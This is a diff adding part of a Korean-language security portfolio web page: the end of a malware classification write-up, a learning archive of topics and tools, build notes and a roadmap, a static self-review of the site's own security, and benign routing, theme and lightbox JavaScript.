+        <div class="wuih"><span class="ft">RAT</span><h3>LiveManagerPlayer</h3><a class="anchor" href="#livemanager">#livemanager</a></div>
+        <p>설치 본체 샘플의 분류를 정적 분석으로 확인했습니다. VirusTotal에서 다수 벤더가 <code class="inl">trojan.qhosts</code>·dropper·banker 계열로 분류한 것을 확인하고, 드로퍼(Install_LiveManagerPlayer) 분석과 겹치는 지표를 대조해 설치 → 실행 흐름을 연결했습니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: VT 분류"><img src="assets/img/livemanager-03.webp" alt="VirusTotal에서 qhosts·banker 계열로 분류된 결과" loading="lazy"></button><figcaption>VirusTotal 계열 분류(qhosts·banker)</figcaption></figure>
+      </article>
+      <div style="margin-top:26px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#writeups">← 실습·분석 목록</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== LEARNING ===================== -->
+<div class="view" id="view-learning" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><span>학습 아카이브</span></nav>
+      <h1 class="dtitle" tabindex="-1">학습 아카이브</h1>
+      <p class="dsum">암호·OS·네트워크 개념부터 리버싱·웹/시스템 취약점·침해사고·악성코드 분석까지 실습 중심으로 학습했습니다. 직접 설명할 수 있는 주제와 관련 사례를 연결합니다.</p>
+      <div class="subhead">주제 영역</div>
+      <div class="topics">
+        <span class="topic">암호학 · 정보보안개론</span><span class="topic">Windows · Linux 시스템</span><span class="topic">리버싱 · 어셈블리</span><span class="topic">네트워크 · 인프라</span><span class="topic">웹 해킹</span><span class="topic">시스템 취약점 진단</span><span class="topic">보안솔루션 운영</span><span class="topic">통합보안관제(ELK)</span><span class="topic">침해사고 분석</span><span class="topic">악성코드 분석</span><span class="topic">BOF · 셸코드</span><span class="topic">디지털 포렌식</span>
+      </div>
+      <div class="subhead">도구</div>
+      <div class="topics">
+        <span class="topic">Burp Suite</span><span class="topic">OWASP ZAP</span><span class="topic">Ghidra</span><span class="topic">OllyDbg</span><span class="topic">Metasploit</span><span class="topic">Volatility</span><span class="topic">FTK Imager</span><span class="topic">Wireshark</span><span class="topic">Sysmon</span><span class="topic">Elastic Stack</span><span class="topic">pfSense · Snort</span><span class="topic">Cuckoo</span>
+      </div>
+      <div class="subhead">관련 사례</div>
+      <div class="rowlist">
+        <a class="row" href="#ssrf"><span class="rdom">WEB</span><span class="rt"><b>웹 해킹 → SSRF·웹 진단</b></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#bof"><span class="rdom">SYSTEM</span><span class="rt"><b>애플리케이션 해킹 → BOF</b></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#malware"><span class="rdom">MALWARE</span><span class="rt"><b>악성코드 분석 → 정적·동적·포렌식</b></span><span class="rgo">읽기 →</span></a>
+      </div>
+      <p class="disc">학습 노션의 기록 분류 수: 뉴스 71 · 과제 11 · 수업 81 · 실습 28건. 이는 노션에 정리한 기록의 분류 수이며 성과 지표가 아닙니다.</p>
+      <div style="margin-top:22px"><a class="btn" href="#home">← 홈으로</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== BLOG / 제작 기록 ===================== -->
+<div class="view" id="view-blog" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><span>제작 기록</span></nav>
+      <h1 class="dtitle" tabindex="-1">제작 기록</h1>
+      <p class="dsum">포트폴리오를 만들며 내린 결정과 그 이유를 기록합니다. 기획·디자인·개발의 역할 분담과 실제 작업 중 바로잡은 내용을 남깁니다.</p>
+      <div class="report">
+        <div class="rsec"><h3><span class="n">01</span> 글 · 긴 실습 모음에서 지원자 중심 홈으로 바꾼 이유</h3><div class="rbody">
+          <p>처음에는 그동안의 실습·분석을 한 페이지에 길게 나열했습니다. 내용은 많았지만, 포트폴리오를 처음 보는 사람이 <b>"누구인지 → 어떤 경력·기술이 있는지 → 그걸 증명하는 사례가 무엇인지"</b>를 빠르게 파악하기 어려웠습니다.</p>
+          <p>그래서 홈을 <b>소개 → 경력·핵심 기술 → 대표 사례 → 프로젝트 → 실습·분석</b> 요약으로 재구성하고, 긴 분석 본문과 다수 캡처는 공유 가능한 상세 뷰(목록·목차·돌아가기)로 분리했습니다. 홈에서는 "주장 → 근거 → 자세히 보기"가 반복되도록 했습니다.</p>
+          <p>정확성 원칙도 다시 세웠습니다. <b>관찰한 것과 재검증이 필요한 것을 구분</b>하고, 페이지 전체가 검증됐다고 읽히는 표기를 사례별 실제 상태로 바꿨습니다. 잘못된 캡션을 바로잡았고(예: 웹 서버 권한 셸 www-data ↔ 권한 상승 root, ZAP 수정 전/후 화면, miniEDR의 샘플 라벨 ↔ 매칭 룰 이름 불일치), 공개 이미지의 쿠키·토큰·키·암호·해시·연락처는 실제 픽셀로 가렸습니다.</p>
+          <p>제작 역할은 ChatGPT 기획, Claude Code 개발, Stitch 디자인이며, 공격 가설·실제 실습·증거 판단·공개 범위 선별은 본인이 직접 수행하고 설명합니다.</p>
+        </div></div>
+        <div class="rsec"><h3><span class="n">02</span> 다음에 공개할 것 (로드맵)</h3><div class="rbody">
+          <p>아래 항목은 실제 근거·결과물이 준비되면 공개합니다. 준비 전에는 완료로 표시하지 않고 계획으로 남깁니다.</p>
+          <div class="flow">
+            <div class="f"><span class="n" style="color:var(--amber)">예정</span><span class="t"><b>DVWA 실무형 보고서</b> — 수동 공격 재검증과 정상 기능 회귀 증거를 모아 PDF·본문으로 연결</span></div>
+            <div class="f"><span class="n" style="color:var(--amber)">예정</span><span class="t"><b>리눅스 진단 스크립트</b> — 작성 범위·실제 판정·테스트 근거와 실행 파일이 준비된 뒤 공개</span></div>
+            <div class="f"><span class="n" style="color:var(--amber)">예정</span><span class="t"><b>포트폴리오 Q&amp;A 챗봇</b> — 공개 문서 기반 답변, 서버 출처 검증, 안전한 렌더링, 사용량 제한. 묘라 운세 상담 화면과는 별개 기능</span></div>
+            <div class="f"><span class="n" style="color:var(--amber)">예정</span><span class="t"><b>챗봇 공격·방어 평가</b> — 모델·코드·데이터 버전과 성공·오거부·오류의 실제 결과를 공개. 묘라 평가 수치를 재사용하지 않음</span></div>
+            <div class="f"><span class="n" style="color:var(--good)">진행</span><span class="t"><b>사이트 자체 보안 검증</b> — 1차 정적 검증 완료, <a href="#security" style="color:var(--fg)">보안 검증 보기 →</a></span></div>
+          </div>
+        </div></div>
+      </div>
+      <div style="margin-top:28px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#security">사이트 보안 검증 →</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== SECURITY SELF-REVIEW ===================== -->
+<div class="view" id="view-security" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><a href="#blog">제작 기록</a><span class="sep">/</span><span>사이트 보안 검증</span></nav>
+      <h1 class="dtitle" tabindex="-1">사이트 자체 보안 검증 — 1차</h1>
+      <p class="dsum">이 포트폴리오 사이트 자체를 대상으로 한 정적 검증 기록입니다. 대상은 공개용 정적 사이트(단일 HTML, 백엔드·폼 없음)이며, 이 문서는 사이트 보안 점검 "완료"가 아니라 현재 구성에서 확인한 1차 점검 결과입니다.</p>
+      <div class="meta">
+        <div class="m"><div class="mk">대상</div><div class="mv">정적 포트폴리오(현재 버전)</div></div>
+        <div class="m"><div class="mk">구성</div><div class="mv">단일 HTML · 백엔드 없음</div></div>
+        <div class="m"><div class="mk">방식</div><div class="mv">소스 정적 검토</div></div>
+        <div class="m"><div class="mk">상태 표기</div><div class="mv">확인 / 해당 없음 / 보완 예정</div></div>
+      </div>
+      <table class="evtable" style="margin-top:22px">
+        <caption>상태: 정상 통제 확인 = 현재 구성에서 문제를 확인하지 못함 · 해당 없음(N/A) = 해당 기능 없음 · 보완 예정 = 호스팅·기능 추가 시 처리.</caption>
+        <thead><tr><th>점검 항목</th><th>확인 내용</th><th>상태</th></tr></thead>
+        <tbody>
+          <tr><td>서버·데이터 경계</td><td>백엔드·API·DB 없음. 공개용 정적 콘텐츠만 배포. 서버측 주입·인증·권한 취약점은 해당 없음</td><td>N/A</td></tr>
+          <tr><td>입력 처리 · 폼</td><td>사용자 입력을 받는 폼·검색이 없음. 처리할 신뢰 경계가 없음</td><td>N/A</td></tr>
+          <tr><td>출력 렌더링 · XSS</td><td>본문은 모두 작성자가 넣은 정적 HTML. 스크립트는 외부·사용자 데이터를 <code class="inl">innerHTML</code>로 삽입하지 않음(고정 뷰 토글·고정 이미지 src/alt만 사용)</td><td style="color:var(--good)">정상 통제 확인</td></tr>
+          <tr><td>외부 링크</td><td>모든 <code class="inl">target="_blank"</code>에 <code class="inl">rel="noopener noreferrer"</code> 적용. 연결 대상은 GitHub·OWASP·공식 권고로 한정</td><td style="color:var(--good)">정상 통제 확인</td></tr>
+          <tr><td>비밀값 노출</td><td>공개 이미지의 쿠키·세션·토큰·API 키·암호·해시·연락처를 실제 픽셀로 마스킹. 비공개 저장소 원본 미배포</td><td style="color:var(--good)">처리(핵심) · 추가 검토 진행</td></tr>
+          <tr><td>정적 산출물 정보 노출</td><td>배포 파일에 키·토큰·개인정보 비포함을 확인. 민감 원본 문서는 비배포</td><td style="color:var(--good)">정상 통제 확인</td></tr>
+          <tr><td>보안 헤더 · HTTPS</td><td>CSP·HSTS·X-Content-Type-Options 등은 실제 호스팅 단계에서 적용 예정(현재는 미리보기 환경)</td><td style="color:var(--amber)">보완 예정(호스팅 시)</td></tr>
+          <tr><td>접근성 · 안정성</td><td>표준 문서 선언·언어·뷰포트, 모바일 메뉴, 접근 가능한 이미지 확대 대화상자, 대비 개선을 적용</td><td style="color:var(--good)">적용</td></tr>
+        </tbody>
+      </table>
+      <p class="disc">향후 챗봇 등 동적 기능을 추가하면 입력 검증·출력 인코딩·출처 검증·사용량 제한을 다시 설계하고, 해당 기능에 대한 공격·방어 결과를 별도로 공개합니다. 이번 정적 검토를 사이트 전체의 보안성 보장으로 확대하지 않습니다.</p>
+      <div style="margin-top:24px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#blog">← 제작 기록</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div><b>성도윤</b> · 보안 포트폴리오</div>
+      <nav class="r" aria-label="바닥글 메뉴"><a href="#home">홈</a><a href="#about">소개·경력</a><a href="#cases">진단 리스트</a><a href="#projects">프로젝트 리스트</a><a href="#writeups">실습·분석</a><a href="#learning">학습</a></nav>
+    </div>
+    <p style="margin-top:16px;font-family:var(--mono);font-size:11px;color:var(--faint)">제작: ChatGPT 기획 · Claude Code 개발 · Stitch 디자인 · 성도윤 실습·검증 · © 2026</p>
+  </div>
+</footer>
+
+<div class="lb" id="lb" role="dialog" aria-modal="true" aria-label="이미지 확대 보기" hidden>
+  <button class="lb-close" id="lbx" type="button">닫기 ✕ (Esc)</button>
+  <img id="lbimg" src="" alt="">
+  <p class="lb-cap" id="lbcap"></p>
+</div>
+
+<script>
+(function(){
+  "use strict";
+  // theme: follow browser by default; toggle overrides and persists
+  var root=document.documentElement;
+  function setTheme(t){ if(t==="light"||t==="dark"){root.setAttribute("data-theme",t);} else {root.removeAttribute("data-theme");} }
+  try{ var saved=localStorage.getItem("theme"); if(saved) setTheme(saved); }catch(e){}
+  function effTheme(){ var t=root.getAttribute("data-theme"); if(t) return t; return (window.matchMedia && window.matchMedia("(prefers-color-scheme: light)").matches)?"light":"dark"; }
+  var tt=document.getElementById("themetoggle");
+  function updTT(){ if(tt){ var d=effTheme()==="dark"; tt.textContent=d?"☀":"☾"; tt.setAttribute("aria-label",(d?"라이트":"다크")+" 모드로 전환"); } }
+  updTT();
+  if(tt){ tt.addEventListener("click",function(){ var n=effTheme()==="dark"?"light":"dark"; setTheme(n); try{localStorage.setItem("theme",n);}catch(e){} updTT(); }); }
+  if(window.matchMedia){ try{ window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",updTT); }catch(e){} }
+
+  var VIEWS=["home","about","cases","dvwa","wordpress","projects","miniedr","myora","writeups","ssrf","web","bof","system","network","forensic","malware","learning","blog","security"];
+  // map sub-views to the nav group they belong to (for aria-current)
+  var GROUP={about:"about",cases:"cases",dvwa:"cases",wordpress:"cases",projects:"projects",miniedr:"projects",myora:"projects",writeups:"writeups",ssrf:"writeups",web:"writeups",bof:"writeups",system:"writeups",network:"writeups",forensic:"writeups",malware:"writeups",learning:"learning",blog:"blog",security:"blog",contact:"contact",home:"home"};
+  // individual write-up items: hash -> {view: collection view, anchor: element id}
+  var ITEMS={
+    sqli:{v:"web",a:"it-sqli"},xss:{v:"web",a:"it-xss"},csrf:{v:"web",a:"it-csrf"},upload:{v:"web",a:"it-upload"},filedl:{v:"web",a:"it-filedl"},dirindex:{v:"web",a:"it-dirindex"},adminexpose:{v:"web",a:"it-adminexpose"},
+    calc:{v:"system",a:"it-calc"},rpc:{v:"system",a:"it-rpc"},nmap:{v:"system",a:"it-nmap"},ssploit:{v:"system",a:"it-ssploit"},ssh:{v:"system",a:"it-ssh"},cve3623:{v:"system",a:"it-cve3623"},tcpclose:{v:"system",a:"it-tcpclose"},sshtunnel:{v:"system",a:"it-sshtunnel"},lindiag:{v:"system",a:"it-lindiag"},openedr:{v:"system",a:"it-openedr"},
+    pfsense:{v:"network",a:"it-pfsense"},elastic:{v:"network",a:"it-elastic"},packet:{v:"network",a:"it-packet"},nitroba:{v:"network",a:"it-nitroba"},
+    dbd:{v:"forensic",a:"it-dbd"},recon:{v:"forensic",a:"it-recon"},deface:{v:"forensic",a:"it-deface"},ftk:{v:"forensic",a:"it-ftk"},driveby:{v:"forensic",a:"it-driveby"},cuckoo:{v:"forensic",a:"it-cuckoo"},hyper:{v:"forensic",a:"it-hyper"},
+    m518:{v:"malware",a:"it-m518"},beast:{v:"malware",a:"it-beast"},clickfix:{v:"malware",a:"it-clickfix"},wanna:{v:"malware",a:"it-wanna"},htear:{v:"malware",a:"it-htear"},remcos:{v:"malware",a:"it-remcos"},orcus:{v:"malware",a:"it-orcus"},badusb:{v:"malware",a:"it-badusb"},banker:{v:"malware",a:"it-banker"},installlmp:{v:"malware",a:"it-installlmp"},livemanager:{v:"malware",a:"it-livemanager"}
+  };
+  var navlinks=document.querySelectorAll(".navmenu a[data-nav]");
+
+  function routeName(){ var h=(location.hash||"").replace(/^#/,""); if(h==="contact") return "home"; if(VIEWS.indexOf(h)>=0) return h; if(ITEMS[h]) return ITEMS[h].v; return "home"; }
+  function show(name){
+    VIEWS.forEach(function(v){ var el=document.getElementById("view-"+v); if(el) el.hidden=(v!==name); });
+    var grp=GROUP[name]||"";
+    navlinks.forEach(function(a){ if(a.getAttribute("data-nav")===grp){ a.setAttribute("aria-current","true"); } else { a.removeAttribute("aria-current"); } });
+    window.scrollTo(0,0);
+    var view=document.getElementById("view-"+name);
+    if(view){ var h=view.querySelector(".dtitle, h1.name"); if(h){ try{ h.focus({preventScroll:true}); }catch(e){ h.focus(); } } }
+  }
+  function scrollToItem(a){
+    var target=document.getElementById(a); if(!target) return;
+    var userScrolled=false;
+    function onUser(){ userScrolled=true; }
+    window.addEventListener("wheel",onUser,{passive:true});
+    window.addEventListener("touchmove",onUser,{passive:true});
+    function go(){ if(userScrolled) return; try{ target.scrollIntoView({block:"start"}); }catch(e){} }
+    go();
+    var hd=target.querySelector("h3"); if(hd){ hd.setAttribute("tabindex","-1"); try{ hd.focus({preventScroll:true}); }catch(e){ hd.focus(); } }
+    var view=target.closest(".view");
+    if(view){ Array.prototype.forEach.call(view.querySelectorAll("img"),function(im){ if(!im.complete){ im.addEventListener("load",go,{once:true}); im.addEventListener("error",go,{once:true}); } }); }
+    setTimeout(function(){ go(); window.removeEventListener("wheel",onUser); window.removeEventListener("touchmove",onUser); },800);
+  }
+  function route(){
+    var h=(location.hash||"").replace(/^#/,"");
+    if(h==="contact"){ show("home"); var c=document.getElementById("contact"); if(c) c.scrollIntoView(); return; }
+    if(ITEMS[h]){ show(ITEMS[h].v); scrollToItem(ITEMS[h].a); return; }
+    show(routeName());
+  }
+  window.addEventListener("hashchange",route);
+
+  // mobile nav
+  var nav=document.getElementById("nav"), tg=document.getElementById("navtoggle"), menu=document.getElementById("navmenu");
+  function setNav(o){ nav.setAttribute("data-open",o?"true":"false"); tg.setAttribute("aria-expanded",o?"true":"false"); }
+  tg.addEventListener("click",function(){ setNav(nav.getAttribute("data-open")!=="true"); });
+  menu.addEventListener("click",function(e){ if(e.target.closest("a")) setNav(false); });
+
+  // in-view TOC scroll (avoids changing the route hash)
+  document.addEventListener("click",function(e){
+    var t=e.target.closest("[data-to]"); if(t){ e.preventDefault(); var el=document.getElementById(t.getAttribute("data-to")); if(el) el.scrollIntoView({behavior:"smooth",block:"start"}); return; }
+  });
+
+  // lightbox
+  var lb=document.getElementById("lb"), lbimg=document.getElementById("lbimg"), lbcap=document.getElementById("lbcap"), lbx=document.getElementById("lbx"), last=null;
+  function cap(btn){ var f=btn.closest("figure"); if(f){ var c=f.querySelector("figcaption"); if(c) return c.textContent; } var fi=btn.closest(".find"); if(fi){ var hh=fi.querySelector("h4"); if(hh) return hh.textContent; } return btn.querySelector("img").alt; }
+  function openLB(btn){ last=btn; var img=btn.querySelector("img"); lbimg.src=img.getAttribute("src"); lbimg.alt=img.alt; lbcap.textContent=cap(btn); lb.hidden=false; lbx.focus(); }
+  function closeLB(){ lb.hidden=true; lbimg.src=""; if(last){ last.focus(); last=null; } }
+  document.addEventListener("click",function(e){ var z=e.target.closest(".zoom"); if(z){ e.preventDefault(); openLB(z); } });
+  lbx.addEventListener("click",closeLB);
+  lb.addEventListener("click",function(e){ if(e.target===lb) closeLB(); });
+  document.addEventListener("keydown",function(e){
+    if(!lb.hidden){ if(e.key==="Escape") closeLB(); else if(e.key==="Tab"){ e.preventDefault(); lbx.focus(); } return; }
+    if(e.key==="Escape" && nav.getAttribute("data-open")==="true"){ setNav(false); tg.focus(); }
+  });
+
+  route();
+})();
+</script>
+</body>
+</html>
